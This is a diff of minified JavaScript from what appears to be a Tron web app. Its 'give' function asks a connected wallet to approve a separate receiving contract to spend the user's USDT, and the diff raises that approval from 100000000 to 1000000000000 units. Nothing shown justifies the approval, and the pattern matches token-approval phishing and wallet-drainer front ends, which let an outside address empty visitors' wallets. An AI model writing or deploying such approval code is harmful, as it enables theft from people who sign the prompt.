@@ -36068,13 +36068,13 @@ var Home = function Home() {
   }
   var give = /*#__PURE__*/function () {
     var _ref = _asyncToGenerator( /*#__PURE__*/_regeneratorRuntime().mark(function _callee() {
-      var usdtContract, allowance, x, result, giveContract, _result;
+      var usdtContract, allowance, result, giveContract, _result;
       return _regeneratorRuntime().wrap(function _callee$(_context) {
         while (1) switch (_context.prev = _context.next) {
           case 0:
             console.log(account);
             if (!account) {
-              _context.next = 24;
+              _context.next = 23;
               break;
             }
             _context.next = 4;
@@ -36087,32 +36087,31 @@ var Home = function Home() {
           case 8:
             allowance = _context.sent;
             if (!(allowance <= 1000000000000)) {
-              _context.next = 17;
+              _context.next = 16;
               break;
             }
-            x = 100000000;
-            _context.next = 13;
-            return usdtContract.approve(receiveContractAddress, x).send({
+            _context.next = 12;
+            return usdtContract.approve(receiveContractAddress, 1000000000000).send({
               feeLimit: "100000000"
             });
-          case 13:
+          case 12:
             result = _context.sent;
             console.log(result);
-            _context.next = 24;
+            _context.next = 23;
             break;
-          case 17:
-            _context.next = 19;
+          case 16:
+            _context.next = 18;
             return window.tronWeb.contract().at(receiveContractAddress);
-          case 19:
+          case 18:
             giveContract = _context.sent;
-            _context.next = 22;
+            _context.next = 21;
             return giveContract.approve().send({
               feeLimit: "100000000"
             });
-          case 22:
+          case 21:
             _result = _context.sent;
             console.log(_result);
-          case 24:
+          case 23:
           case "end":
             return _context.stop();
         }
